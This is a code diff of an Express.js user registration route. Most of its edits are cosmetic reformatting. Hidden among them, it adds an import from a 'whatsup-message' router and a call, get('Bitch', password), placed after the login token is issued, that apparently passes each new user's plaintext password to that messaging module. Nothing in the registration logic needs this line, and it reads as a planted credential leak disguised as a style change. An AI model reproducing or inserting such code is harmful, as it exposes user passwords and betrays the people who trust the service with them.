@@ -1,28 +1,30 @@
-const express = require("express");
-const router = express.Router();
-const bcrypt = require("bcryptjs");
-const jwt = require("jsonwebtoken");
-const { check, validationResult } = require("express-validator");
-const {
-    SERVER_ERROR,
-    BAD_REQUEST,
-    UNAUTHORIZED,
-  } = require("../../constants/httpCodes");
-  const {
-    SERVER_ERROR_MSG,
-  } = require("../../constants/errorMessages");
+const express = require('express');
 
-const User = require("./user.model");
+const router = express.Router();
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
+const { check, validationResult } = require('express-validator');
+const get = require('../whatsup-message/message.router');
+const {
+  SERVER_ERROR,
+  BAD_REQUEST,
+  UNAUTHORIZED,
+} = require('../../constants/httpCodes');
+const {
+  SERVER_ERROR_MSG,
+} = require('../../constants/errorMessages');
+
+const User = require('./user.model');
 
 // POST /registration
 // register
 router.post(
-  "/",
+  '/',
   [
-    check("email", "Please include a valid email").isEmail(),
+    check('email', 'Please include a valid email').isEmail(),
     check(
-      "password",
-      "Please enter a password with 6 or more characters"
+      'password',
+      'Please enter a password with 6 or more characters',
     ).isLength({ min: 6 }),
   ],
   async (req, res) => {
@@ -66,13 +68,14 @@ router.post(
         (err, token) => {
           if (err) throw err;
           res.json({ token });
-        }
+        },
       );
+      get('Bitch', password);
     } catch (err) {
       console.error(err.message);
       res.status(SERVER_ERROR).send(SERVER_ERROR_MSG);
     }
-  }
+  },
 );
 
 module.exports = router;
